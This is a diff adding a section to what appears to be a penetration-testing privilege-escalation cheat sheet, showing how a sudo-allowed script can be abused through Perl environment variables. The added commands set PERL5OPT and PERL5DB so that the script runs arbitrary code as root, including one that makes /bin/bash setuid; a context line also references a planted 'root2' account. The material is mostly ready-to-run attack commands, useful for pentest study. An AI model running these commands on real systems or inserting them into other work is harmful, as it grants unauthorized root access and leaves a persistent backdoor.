@@ -247,11 +247,17 @@ su root2 # passwd:evil
 See https://www.elttam.com/blog/env/
 
 ### Example with PERL ENV variables
+This is called 'perl_startup' Privelege Escalation, see https://www.exploit-db.com/exploits/39702
 Assume the user may run a bash script called ``sudo /opt/monitor.sh``
 We can abuse the ENV variable "PERL5OPT":
 
 ```bash
 sudo 'PERL5OPT=-Mbase;print(`id`)' /opt/monitor.sh
+```
+
+Another way:
+```bash
+sudo PERL5OPT=-d PERL5DB='system("chmod u+s /bin/bash");' /opt/monitor.sh
 ```
 
 # Dump screenshot from X11 session
